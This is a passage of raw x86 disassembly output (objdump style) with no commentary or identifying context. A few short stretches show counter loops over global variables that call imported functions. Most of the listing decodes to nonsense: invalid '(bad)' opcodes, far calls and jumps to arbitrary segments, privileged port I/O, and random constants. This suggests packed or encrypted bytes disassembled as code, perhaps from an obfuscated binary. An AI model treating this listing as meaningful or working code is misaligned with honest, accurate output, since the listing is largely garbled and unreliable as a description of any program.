  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x4b9d905f],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40acb0
  40ad2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad2d:	mov    eax,0x9b4bdcd6
  40ad32:	or     DWORD PTR [edi+0x7a],0xa310583d
  40ad39:	lea    ecx,ds:0xf7e8f45f
  40ad3f:	mov    edx,fs
  40ad41:	xchg   ecx,eax
  40ad42:	sub    bh,dl
  40ad44:	in     al,dx
  40ad45:	inc    BYTE PTR [esi+0x75516972]
  40ad4b:	mov    al,ds:0xad01de72
  40ad50:	fild   QWORD PTR [esi+0x2b]
  40ad53:	pop    eax
  40ad54:	push   esi
  40ad55:	out    dx,eax
  40ad56:	fsubr  DWORD PTR [edi-0x5a1476b2]
  40ad5c:	cmc    
  40ad5d:	lods   al,BYTE PTR ds:[esi]
  40ad5e:	loop   0x40ad41
  40ad60:	call   0x3614:0x80db3c3b
  40ad67:	and    dh,BYTE PTR [ecx]
  40ad69:	xchg   esp,eax
  40ad6a:	xor    eax,0x14dd1d85
  40ad70:	test   BYTE PTR [edx-0x26],bh
  40ad73:	sbb    ebp,DWORD PTR [edx+0x7e4593b]
  40ad79:	xchg   ebp,eax
  40ad7a:	lock fwait
  40ad7c:	xchg   ebx,eax
  40ad7d:	mov    edx,0xb0881aef
  40ad82:	adc    BYTE PTR [esi-0x1b],0x87
  40ad86:	pop    eax
  40ad87:	jno    0x40ad99
  40ad89:	std    
  40ad8a:	mov    esp,0x45ec6a3c
  40ad8f:	fsub   DWORD PTR [eax]
  40ad91:	call   0xd4aa:0xda23fadf
  40ad98:	and    DWORD PTR [edi-0x2d],edi
  40ad9b:	push   ebp
  40ad9c:	call   0x8058:0x651cfc41
  40ada3:	mov    dl,0x4
  40ada5:	popf   
  40ada6:	and    BYTE PTR [eax-0x3f],dl
  40ada9:	xor    ch,bl
  40adab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adac:	jecxz  0x40ad92
  40adae:	pop    ebx
  40adaf:	fidivr DWORD PTR [edi-0x6c]
  40adb2:	pushf  
  40adb3:	or     al,0x25
  40adb5:	daa    
  40adb6:	addr16 pop ebx
  40adb8:	pop    eax
  40adb9:	adc    al,0xd2
  40adbb:	out    dx,al
  40adbc:	aam    0xf8
  40adbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adbf:	add    eax,0x37a76552
  40adc4:	bound  edi,QWORD PTR [edx+ebx*8]
  40adc7:	mov    dl,0x9e
  40adc9:	jmp    0x40ade3
  40adcb:	jo     0x40adb7
  40adcd:	xor    eax,0xcd4a290e
  40add2:	mov    dl,BYTE PTR ds:0xf8cd446e
  40add8:	inc    esi
  40add9:	out    0xb2,eax
  40addb:	ficom  DWORD PTR [ebx-0x1ef55a73]
  40ade1:	inc    esp
  40ade2:	mov    esi,0x50eb0491
  40ade7:	adc    cl,dh
  40ade9:	cli    
  40adea:	ret    
  40adeb:	sub    DWORD PTR [eax+0x5fce209c],0x2a0e6f6
  40adf5:	popa   
  40adf6:	into   
  40adf7:	mov    eax,ds:0xc6a1e80a
  40adfc:	inc    ecx
  40adfd:	jmp    0xa05fbda2
  40ae02:	push   edi
  40ae03:	bound  eax,QWORD PTR [esi-0x53da6da5]
  40ae09:	push   ds
  40ae0a:	xor    BYTE PTR [edx],0x21
  40ae0d:	data16 lock mov al,0x58
  40ae11:	out    0x71,al
  40ae13:	dec    eax
  40ae14:	inc    esi
  40ae15:	call   0xdcec908f
  40ae1a:	mov    ecx,0xed362c43
  40ae1f:	inc    ecx
  40ae20:	pusha  
  40ae21:	ins    BYTE PTR es:[edi],dx
  40ae22:	enter  0x74a6,0x50
  40ae26:	stc    
  40ae27:	(bad)  
  40ae28:	das    
  40ae29:	(bad)  
  40ae2a:	ins    BYTE PTR es:[edi],dx
  40ae2b:	neg    DWORD PTR [edi+ebp*4-0x34]
  40ae2f:	pop    ebx
  40ae30:	popf   
  40ae31:	jne    0x40adf4
  40ae33:	ss int 0x2f
  40ae36:	dec    esi
  40ae37:	jge    0x40ae80
  40ae39:	jmp    0xba783ab9
  40ae3e:	lods   al,BYTE PTR ds:[esi]
  40ae3f:	test   al,0xcd
  40ae41:	add    eax,0xd9b8b189
  40ae46:	cmp    bh,BYTE PTR [ecx]
  40ae48:	adc    DWORD PTR [edi],ebx
  40ae4a:	xor    dl,cl
  40ae4c:	sbb    edi,DWORD PTR [edx+0x45b7d11c]
  40ae52:	fs nop
  40ae54:	aas    
  40ae55:	xor    ch,BYTE PTR [edi]
  40ae57:	or     esi,0xde6d9f46
  40ae5d:	pushf  
  40ae5e:	mov    edi,0xe3d842e5
  40ae63:	scas   eax,DWORD PTR es:[edi]
  40ae64:	fstp   st(2)
  40ae66:	push   0xffffffe2
  40ae68:	xchg   edi,eax
  40ae69:	(bad)
  40ae6c:	add    ah,BYTE PTR [edx-0xe]
  40ae6f:	sub    ebx,edx
  40ae71:	push   ds
  40ae72:	jp     0x40ae27
  40ae74:	nop
  40ae75:	dec    ebp
  40ae76:	out    0xb2,eax
  40ae78:	or     eax,0x2a8cd5d0
  40ae7d:	and    al,0x70
  40ae7f:	sbb    eax,ecx
  40ae81:	sbb    DWORD PTR [esi+0x20073f93],0xa5d1faa7
  40ae8b:	jne    0x40ae8e
  40ae8d:	test   DWORD PTR [ebx+esi*4-0x67],edx
  40ae91:	jb     0x40aeba
  40ae93:	adc    eax,0x26f3b85d
  40ae98:	je     0x40aee8
  40ae9a:	sbb    eax,0xa02a76f1
  40ae9f:	call   0xb0a9:0xcd98b7d5
  40aea6:	pop    ebp
  40aea7:	cmp    ebx,eax
  40aea9:	fcom   QWORD PTR [edi-0x64e2133f]
  40aeaf:	pushf  
  40aeb0:	sbb    ebp,ebp
  40aeb2:	push   cs
  40aeb3:	mov    ds:0x93dd8162,eax
  40aeb8:	rcr    DWORD PTR [ebx+0x2b],1
  40aebb:	adc    DWORD PTR [ebx],ecx
  40aebd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aebe:	mov    ebp,DWORD PTR [edi+edi*1-0x1a]
  40aec2:	shl    al,0x37
  40aec5:	and    ch,ah
  40aec7:	hlt    
  40aec8:	inc    edx
  40aec9:	ror    DWORD PTR [esi],1
  40aecb:	mov    ebp,0x3e0bf930
  40aed0:	pop    esi
  40aed1:	mov    cs,ecx
  40aed3:	mov    al,0x51
  40aed5:	mov    dh,0x1b
  40aed7:	or     al,0x3b
  40aed9:	inc    eax
  40aeda:	jmp    0x49c:0xb69394a5
  40aee1:	pop    ebp
  40aee2:	call   0xcee74209
  40aee7:	xchg   ecx,eax
  40aee8:	fucomp st(6)
  40aeea:	in     eax,dx
  40aeeb:	scas   eax,DWORD PTR es:[edi]
  40aeec:	add    ah,ch
  40aeee:	imul   DWORD PTR [edi+edx*2]
  40aef1:	lods   al,BYTE PTR ds:[esi]
  40aef2:	ja     0x40af28
  40aef4:	jae    0x40aead
  40aef6:	mov    esi,0xba68c5c6
  40aefb:	out    dx,eax
  40aefc:	xchg   ecx,eax
  40aefd:	xchg   esi,eax
  40aefe:	(bad)  
  40aeff:	sub    DWORD PTR [esi],ecx
  40af01:	add    al,0xb4
  40af03:	(bad)  
  40af04:	mov    al,0x5f
  40af06:	das    
  40af07:	call   FWORD PTR [eax+0x48a47885]
  40af0d:	inc    edi
  40af0e:	sub    BYTE PTR [edi+eiz*2+0x24],dl
  40af12:	cli    
  40af13:	fwait
  40af14:	ja     0x40af8e
  40af16:	push   0xdc711cd
  40af1b:	mov    esi,0x3f5a0535
  40af20:	pop    ecx
  40af21:	loope  0x40aeac
  40af23:	inc    esi
  40af24:	jnp    0x40af13
  40af26:	stc    
  40af27:	es cs int 0xb0
  40af2b:	mul    ch
  40af2d:	call   0x4372a705
  40af32:	arpl   WORD PTR [edx+edx*1],bp
  40af35:	mov    eax,ds:0xeb94dfd2
  40af3a:	daa    
  40af3b:	pop    esi
  40af3c:	ss dec edx
  40af3e:	(bad)  
  40af3f:	mov    ebp,gs
  40af41:	mov    ebx,0xfb7bca7e
  40af46:	sbb    DWORD PTR [ebx-0x28d1374a],eax
  40af4c:	xchg   ebx,eax
  40af4d:	push   0xaa18c3f1
  40af52:	stc    
  40af53:	push   esi
  40af54:	xchg   ebx,eax
  40af55:	or     esi,DWORD PTR [esi+eiz*4]
  40af58:	jge    0x40aefe
  40af5a:	push   esp
  40af5b:	scas   eax,DWORD PTR es:[edi]
  40af5c:	push   esi
  40af5d:	imul   edi,DWORD PTR [edx-0x7f],0xffffffd8
  40af61:	(bad)  
  40af62:	in     al,dx
  40af63:	jle    0x40af3f
  40af65:	xor    dl,ah
  40af67:	jmp    0x71df:0x5a836574
  40af6e:	push   edi
  40af6f:	ret    
  40af70:	pop    ds
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	out    0xf2,al
  40b019:	and    BYTE PTR [eax+0x7e7ef764],bh
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	fs push edx
  40b025:	pop    ecx
  40b026:	popa   
  40b027:	jae    0x40b08b
  40b029:	xchg   edi,eax
  40b02a:	and    BYTE PTR [eax-0xb],bh
  40b02d:	xor    esi,DWORD PTR [ebp+0xfe4860]
  40b033:	xchg   ebp,eax
  40b034:	xor    eax,0x61311a8f
  40b039:	(bad)  
  40b03a:	sub    DWORD PTR [ecx+0x1b],esp
  40b03d:	sub    edx,ecx
  40b03f:	mov    ds:0x6d7c0e38,al
  40b044:	es jmp 0xd50071d7
  40b04a:	jl     0x40b0b0
  40b04c:	jbe    0x40b0b5
  40b04e:	mov    ?,WORD PTR [eax-0x24]
  40b051:	add    BYTE PTR [esi],dl
  40b053:	retf   0x74bb
  40b056:	mov    al,ds:0x4afe0d5
  40b05b:	sub    ah,bl
  40b05d:	mov    cl,0x72
  40b05f:	push   edi
  40b060:	or     edi,DWORD PTR [eax+0x4af85070]
  40b066:	inc    esp
  40b067:	xchg   ecx,eax
  40b068:	adc    eax,0xaea46835
  40b06d:	push   ds
  40b06e:	dec    eax
  40b06f:	(bad)  [esp+ebp*8-0xa1930d1]
  40b076:	inc    edi
  40b077:	inc    ebp
  40b078:	inc    esi
  40b079:	stos   DWORD PTR es:[edi],eax
  40b07a:	retf   0x8bc9
  40b07d:	xor    BYTE PTR [edi],ch
  40b07f:	xchg   ecx,eax
  40b080:	mov    cl,0x48
  40b082:	rol    DWORD PTR [ebp-0x6f],0xf
  40b086:	rcr    edi,0x98
  40b089:	(bad)  
  40b08a:	ror    DWORD PTR [ecx+esi*2+0x7d],cl
  40b08e:	aam    0x86
  40b090:	in     eax,dx
  40b091:	xchg   ecx,eax
  40b092:	mov    ebx,0x9d1fa334
  40b097:	and    al,0x8d
  40b099:	add    dh,BYTE PTR [eiz*2-0x389455ed]
  40b0a0:	adc    DWORD PTR [esi+0x42fe57ed],ecx
  40b0a6:	lods   eax,DWORD PTR ds:[esi]
  40b0a7:	test   DWORD PTR [bp+di-0x662c],0xe0521860
  40b0b0:	pushf  
  40b0b1:	clc    
  40b0b2:	push   ecx
  40b0b3:	clc    
  40b0b4:	test   BYTE PTR [esi+0x1b],dh
  40b0b7:	xor    al,0x82
  40b0b9:	dec    edi
  40b0ba:	addr16 push esp
  40b0bc:	mov    eax,ds:0x8854a7ff
  40b0c1:	xchg   ecx,eax
  40b0c2:	mov    ds:0x450d68d,eax
  40b0c7:	dec    esp
  40b0c8:	jg     0x40b0c9
  40b0ca:	inc    esi
  40b0cb:	int3   
  40b0cc:	gs jle 0x40b0f5
  40b0cf:	mov    dl,0xbc
  40b0d1:	scas   eax,DWORD PTR es:[edi]
  40b0d2:	mov    ebx,edx
  40b0d4:	mov    esp,0x6ed1e7f8
  40b0d9:	push   edi
  40b0da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0db:	or     BYTE PTR ds:0xc92e4880,al
  40b0e1:	test   DWORD PTR [edx+0x4d5e4e17],edx
  40b0e7:	lock in eax,0xd3
  40b0ea:	cmp    BYTE PTR [eax-0x5d],al
  40b0ed:	(bad)  
  40b0ee:	adc    esi,DWORD PTR [edi]
  40b0f0:	out    0xce,eax
  40b0f2:	cld    
  40b0f3:	in     eax,0x2e
  40b0f5:	pop    es
  40b0f6:	mov    edi,0x13a14de4
  40b0fb:	push   eax
  40b0fc:	mov    WORD PTR [ebx-0x64],ss
  40b0ff:	mov    edx,0xd9c1a9a4
  40b104:	cli    
  40b105:	jle    0x40b170
  40b107:	xor    bh,ch
  40b109:	add    edi,DWORD PTR [edx-0xddb7d5a]
  40b10f:	(bad)  
  40b110:	pop    esi
  40b111:	jne    0x40b151
  40b113:	or     dh,BYTE PTR [edx-0x1d5b878c]
  40b119:	iret   
  40b11a:	ds sahf 
  40b11c:	xchg   esp,eax
  40b11d:	and    BYTE PTR [ebp-0x3cc63d80],dl
  40b123:	mov    BYTE PTR [edi+eax*4-0x4],ch
  40b127:	inc    ebp
  40b128:	adc    DWORD PTR [ebp+0x55],0x68
  40b12c:	and    BYTE PTR [esi-0x28],ah
  40b12f:	inc    esi
  40b130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b131:	sbb    al,0xab
  40b133:	js     0x40b182
  40b135:	(bad)  
  40b136:	sar    DWORD PTR [edi-0x28336a2e],1
  40b13c:	lea    ebx,ds:0x9d1bfc4e
  40b142:	das    
  40b143:	and    esp,DWORD PTR [edi]
  40b145:	shl    DWORD PTR [ebx+0x9caa71d],0xd
  40b14c:	inc    ebp
  40b14d:	lods   eax,DWORD PTR ds:[esi]
  40b14e:	repnz or BYTE PTR [edi-0x3352a93f],dl
  40b155:	jmp    DWORD PTR [esi+0x72]
  40b158:	mov    cl,0x88
  40b15a:	imul   ecx,ebx,0xfffffff3
  40b15d:	or     BYTE PTR [edx],al
  40b15f:	jmp    0x1bba8a8d
  40b164:	rol    BYTE PTR [edi+ebx*2+0x8],0xdf
  40b169:	mov    ecx,0x6c107895
  40b16e:	dec    esi
  40b16f:	sbb    ecx,DWORD PTR [ebx+0x59]
  40b172:	inc    eax
  40b173:	(bad)  
  40b174:	out    0xc0,al
  40b176:	pminsw mm0,QWORD PTR [edi-0x2d679f95]
  40b17d:	fdiv   DWORD PTR [edi-0x5c]
  40b180:	mov    esp,0x8f5b5ab3
  40b185:	jns    0x40b11e
  40b187:	cmp    al,0x17
  40b189:	sbb    eax,0x3b59e6b1
  40b18e:	mov    BYTE PTR [edi-0x20c13146],bh
  40b194:	retf   0xf993
  40b197:	xor    DWORD PTR [edx+0x423bfc1d],edx
  40b19d:	sbb    DWORD PTR [ebx],0xffffffae
  40b1a0:	xchg   edx,eax
  40b1a1:	(bad)  
  40b1a2:	and    eax,0x480cf90d
  40b1a7:	lods   eax,DWORD PTR ds:[esi]
  40b1a8:	inc    BYTE PTR [eax-0x25]
  40b1ab:	push   esi
  40b1ac:	jns    0x40b1d9
  40b1ae:	mov    ah,0x17
  40b1b0:	(bad)  
  40b1b1:	sub    al,0x31
  40b1b3:	test   al,0x6c
  40b1b5:	mov    ebx,0xd3bdb2eb
  40b1ba:	or     DWORD PTR [edi+ecx*4+0x4],ebp
  40b1be:	or     BYTE PTR ds:0xd458d43c,bh
  40b1c4:	xlat   BYTE PTR fs:[ebx]
  40b1c6:	mov    ah,0x9d
  40b1c8:	pusha  
  40b1c9:	mov    ah,dh
  40b1cb:	xchg   ecx,eax
  40b1cc:	add    DWORD PTR [ebx+0x107e59a7],ebp
  40b1d2:	gs mov ebp,0x1f2879f5
  40b1d8:	out    dx,al
  40b1d9:	cmp    esi,DWORD PTR [edi]
  40b1db:	pop    esi
  40b1dc:	rcr    edx,0x77
  40b1df:	int3   
  40b1e0:	mov    ecx,0xa062511b
  40b1e5:	push   edx
  40b1e6:	dec    esi
  40b1e7:	ss cmp ch,BYTE PTR ss:[edi+0x3a]
  40b1ec:	(bad)  
  40b1ed:	pop    esp
  40b1ee:	inc    ebx
  40b1ef:	leave  
  40b1f0:	sub    DWORD PTR [ecx+0x15],ebp
  40b1f3:	mov    esp,0x84568ed9
  40b1f8:	or     al,0xa
  40b1fa:	xor    edi,esp
  40b1fc:	gs call 0x77f0:0xd8d1ef8
  40b204:	mov    al,0xe2
  40b206:	mov    bh,0x79
  40b208:	cmp    cl,bh
  40b20a:	nop
  40b20b:	push   edx
  40b20c:	jmp    0x345a:0x3b8d7712
  40b213:	das    
  40b214:	inc    ecx
  40b215:	std    
  40b216:	add    BYTE PTR [edx-0x48da9ac6],0x82
  40b21d:	scas   eax,DWORD PTR es:[edi]
  40b21e:	mov    WORD PTR [edx+esi*8+0x3e11ea94],gs
  40b225:	in     eax,0xec
  40b227:	ins    DWORD PTR es:[edi],dx
  40b228:	fmul   QWORD PTR [esi]
  40b22a:	mov    bl,0x74
  40b22c:	test   BYTE PTR [ebp+eax*1+0x1d942424],bl
  40b233:	push   ds
  40b234:	sub    bh,BYTE PTR [edx]
  40b236:	or     dh,0xa4
  40b239:	mov    ebx,0xb5c0e813
  40b23e:	mov    ah,0x3b
  40b240:	or     al,0x69
  40b242:	aad    0xfd
  40b244:	jle    0x40b263
  40b246:	and    eax,0xf338bd88
  40b24b:	adc    eax,0x286e8445
  40b250:	sub    ch,al
  40b252:	lock dec edi
  40b254:	sar    DWORD PTR [edi+ebp*1-0x117c91ea],0x5d
  40b25c:	pusha  
  40b25d:	mov    WORD PTR [ebx+0x75f8bbd1],es
  40b263:	das    
  40b264:	cs pop ebp
  40b266:	push   ebx
  40b267:	add    BYTE PTR [ebx+ecx*4+0x4d8bec45],ah
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	aam    0x12
  40b285:	jge    0x40b209
  40b287:	cs bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	and    esp,ebp
  40b291:	xor    cl,BYTE PTR [edi+0x47f12977]
  40b297:	xor    BYTE PTR [eax+0x3a869510],al
  40b29d:	mov    WORD PTR [eax+0xf],gs
  40b2a0:	retf   
  40b2a1:	in     eax,0xc5
  40b2a3:	mov    bh,0x5a
  40b2a5:	test   DWORD PTR [bp-0x51],esi
  40b2a9:	mov    bh,0x44
  40b2ab:	push   es
  40b2ac:	mov    ch,0x8d
  40b2ae:	loope  0x40b30a
  40b2b0:	mov    cl,0xa6
  40b2b2:	push   ecx
  40b2b3:	pop    esi
  40b2b4:	dec    esi
  40b2b5:	in     eax,dx
  40b2b6:	aad    0xc2
  40b2b8:	stc    
  40b2b9:	cmp    DWORD PTR [edi+0x25],ebx
  40b2bc:	and    BYTE PTR [edx+0x10],0xea
  40b2c0:	loope  0x40b2d4
  40b2c2:	lea    eax,[eax-0x75]
  40b2c5:	lock pop edi
  40b2c7:	outs   dx,BYTE PTR ds:[esi]
  40b2c8:	push   ss
  40b2c9:	or     edx,DWORD PTR [eax-0x56]
  40b2cc:	xor    DWORD PTR gs:[ebp-0x6e],ebp
  40b2d0:	bound  ebx,QWORD PTR [esi+0x1d36d4d]
  40b2d6:	mov    ch,0x25
  40b2d8:	and    eax,0x6e936db2
  40b2dd:	test   BYTE PTR [edx+0x36],dl
  40b2e0:	xor    edi,ebx
  40b2e2:	pop    es
  40b2e3:	pop    ss
  40b2e4:	pusha  
  40b2e5:	popf   
  40b2e6:	(bad)  [ebx-0x44]
  40b2e9:	dec    esp
  40b2ea:	dec    edi
  40b2eb:	pop    esi
  40b2ec:	daa    
  40b2ed:	adc    DWORD PTR [edi-0x4],ecx
  40b2f0:	lds    eax,FWORD PTR [esi]
  40b2f2:	push   ss
  40b2f3:	jne    0x40b329
  40b2f5:	out    dx,al
  40b2f6:	jl     0x40b360
  40b2f8:	cmp    edx,DWORD PTR ds:0x1e40825c
  40b2fe:	fsubr  QWORD PTR [ebx+edx*2+0x4b]
  40b302:	xchg   BYTE PTR [esi-0x71],dh
  40b305:	call   0xbf0614f5
  40b30a:	push   ebp
  40b30b:	mov    DWORD PTR [ebx-0x693a9379],ebx
  40b311:	les    esi,FWORD PTR [eax]
  40b313:	int    0x6b
  40b315:	aas    
  40b316:	(bad)  
  40b317:	adc    cl,bh
  40b319:	push   edx
  40b31a:	out    0x2b,al
  40b31c:	loope  0x40b2dc
  40b31e:	pop    es
  40b31f:	sbb    al,0xbd
  40b321:	dec    eax
  40b322:	jge    0x40b2bd
  40b324:	(bad)  
  40b325:	out    dx,eax
  40b326:	ins    BYTE PTR es:[edi],dx
  40b327:	xchg   ecx,ebp
  40b329:	(bad)  
  40b32a:	add    al,0xdf
  40b32c:	jns    0x40b39a
  40b32e:	daa    
  40b32f:	jbe    0x40b35d
  40b331:	retf   0x3b76
  40b334:	scas   eax,DWORD PTR es:[edi]
  40b335:	add    bh,BYTE PTR [ebp+0x1f]
  40b338:	inc    eax
  40b339:	dec    edi
  40b33a:	int    0x95
  40b33c:	ss imul esp
  40b33f:	imul   ecx,DWORD PTR [ecx+0x2b3ffa04],0xc172842b
  40b349:	into   
  40b34a:	lahf   
  40b34b:	adc    al,0x3c
  40b34d:	cmp    eax,0xe6520675
  40b352:	pop    es
  40b353:	cmp    DWORD PTR [esi],0x90c8cc2a
  40b359:	push   0x4cf77131
  40b35e:	adc    dh,bl
  40b360:	pop    ebx
  40b361:	ins    DWORD PTR es:[edi],dx
  40b362:	add    eax,esp
  40b364:	ficom  WORD PTR [eax-0x1b]
  40b367:	xchg   esp,eax
  40b368:	mov    esi,0x1b156893
  40b36d:	xlat   BYTE PTR ds:[ebx]
  40b36e:	(bad)  
  40b36f:	sahf   
  40b370:	ins    DWORD PTR es:[edi],dx
  40b371:	pop    es
  40b372:	mov    dh,0x25
  40b374:	adc    BYTE PTR [edx+0x5f],dl
  40b377:	dec    edx
  40b378:	jmp    0xa8929b00
  40b37d:	int3   
  40b37e:	add    bh,bh
  40b380:	adc    al,0x4c
  40b382:	and    BYTE PTR [edx],al
  40b384:	fwait
  40b385:	xchg   ebx,eax
  40b386:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b387:	mov    WORD PTR [edx],cs
  40b389:	jge    0x40b36c
  40b38b:	lds    esi,FWORD PTR [edx]
  40b38d:	xchg   ebp,eax
  40b38e:	in     al,0xf1
  40b390:	cmp    al,0x9f
  40b392:	leave  
  40b393:	jp     0x40b3d5
  40b395:	adc    ebp,DWORD PTR [edi-0x6a3b8b]
  40b39b:	pop    esi
  40b39c:	and    eax,0x993da612
  40b3a1:	rcl    ecx,cl
  40b3a3:	adc    DWORD PTR [edi],edi
  40b3a5:	fwait
  40b3a6:	inc    eax
  40b3a7:	mov    al,0x77
  40b3a9:	sub    BYTE PTR [edx-0x6b4b18d],ch
  40b3af:	aam    0x1e
  40b3b1:	inc    esp
  40b3b2:	mov    edi,0xfedfdd94
  40b3b7:	sahf   
  40b3b8:	(bad)  
  40b3b9:	or     al,0x87
  40b3bb:	adc    bl,BYTE PTR [edx-0x42573640]
  40b3c1:	inc    edx
  40b3c2:	pop    edi
  40b3c3:	mov    esi,0x488e8f72
  40b3c8:	pop    esp
  40b3c9:	fcomp  QWORD PTR [ebx-0x55]
  40b3cc:	in     al,dx
  40b3cd:	jnp    0x40b418
  40b3cf:	jns    0x40b3d5
  40b3d1:	loopne 0x40b415
  40b3d3:	sbb    al,0x9e
  40b3d5:	js     0x40b3eb
  40b3d7:	cs pop ss
  40b3d9:	inc    ecx
  40b3da:	jg     0x40b3d3
  40b3dc:	je     0x40b3a0
  40b3de:	les    edi,FWORD PTR [ebx+0x12f6bc11]
  40b3e4:	push   DWORD PTR [edi+edx*4+0x21]
  40b3e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e9:	mov    WORD PTR [ebx-0x7a54f6c4],fs
  40b3ef:	pop    ecx
  40b3f0:	in     al,0x52
  40b3f2:	add    al,0x6c
  40b3f4:	mov    ebx,0x29c9fb68
  40b3f9:	pop    esi
  40b3fa:	add    bl,al
  40b3fc:	mov    ch,0x63
  40b3fe:	inc    esp
  40b3ff:	mov    al,ds:0xbac4c4fc
  40b404:	jae    0x40b3b9
  40b406:	mov    BYTE PTR [edx],al
  40b408:	mov    edi,0x13c31010
  40b40d:	mov    ecx,0xb28ac5f
  40b412:	xchg   edx,eax
  40b413:	(bad)
  40b416:	jp     0x40b454
  40b418:	outs   dx,DWORD PTR ds:[esi]
  40b419:	or     DWORD PTR [edi+edi*1],eax
  40b41c:	jecxz  0x40b467
  40b41e:	xlat   BYTE PTR ds:[ebx]
  40b41f:	rcr    BYTE PTR [ebx],0x77
  40b422:	mov    ch,BYTE PTR [eiz*1+0x69591036]
  40b429:	(bad)  
  40b42a:	in     eax,0x2c
  40b42c:	mov    eax,0x2f0b0eba
  40b431:	jb     0x40b43e
  40b433:	dec    ebp
  40b434:	cmp    esi,DWORD PTR [edx]
  40b436:	jmp    0x599266a8
  40b43b:	inc    ecx
  40b43c:	dec    ecx
  40b43d:	out    dx,al
  40b43e:	add    DWORD PTR [edi-0x1029f49],esp
  40b444:	fsubr  DWORD PTR [ebp-0x69]
  40b447:	mov    ebp,0x7054ca99
  40b44c:	mov    cl,0x8f
  40b44e:	xchg   ebx,eax
  40b44f:	pop    ss
  40b450:	ret    
  40b451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b452:	out    0x9f,eax
  40b454:	jnp    0x40b4af
  40b456:	jns    0x40b4a3
  40b458:	sbb    DWORD PTR [edi-0x27],0xe336b
  40b45f:	push   ebp
  40b460:	and    ebx,0x8dc93183
  40b466:	mov    edx,0x2b4db285
  40b46b:	(bad)  
  40b46c:	icebp  
  40b46d:	adc    DWORD PTR [ecx+ebp*8-0x1a],ecx
  40b471:	into   
  40b472:	and    DWORD PTR [ecx],ebx
  40b474:	(bad)  
  40b475:	loope  0x40b40e
  40b477:	ret    
  40b478:	inc    edi
  40b479:	rol    DWORD PTR ds:0xbad64558,1
  40b47f:	jp     0x40b4ad
  40b481:	jo     0x40b4aa
  40b483:	inc    ecx
  40b484:	xlat   BYTE PTR ds:[ebx]
  40b485:	fwait
  40b486:	mov    dh,0xff
  40b488:	loopne 0x40b40f
  40b48a:	add    dh,BYTE PTR [ecx+eiz*1]
  40b48d:	pop    ebp
  40b48e:	je     0x40b4e2
  40b490:	pop    edx
  40b491:	loop   0x40b42d
  40b493:	jnp    0x40b4b4
  40b495:	loope  0x40b4b7
  40b497:	inc    ecx
  40b498:	outs   dx,BYTE PTR ds:[esi]
  40b499:	add    al,ah
  40b49b:	jae    0x40b41f
  40b49d:	je     0x40b470
  40b49f:	inc    esp
  40b4a0:	sbb    dh,BYTE PTR fs:[ebx-0x14]
  40b4a4:	xchg   edi,eax
  40b4a5:	jb     0x40b522
  40b4a7:	jbe    0x40b522
  40b4a9:	sub    eax,0xe4360afc
  40b4ae:	(bad)  
  40b4af:	shl    DWORD PTR [eax],cl
  40b4b1:	mov    cl,BYTE PTR [eax+0x1980d108]
  40b4b7:	(bad)  
  40b4b8:	repnz adc dh,dh
  40b4bb:	dec    ebx
  40b4bc:	loop   0x40b537
  40b4be:	addr16 push cs
  40b4c0:	pop    ss
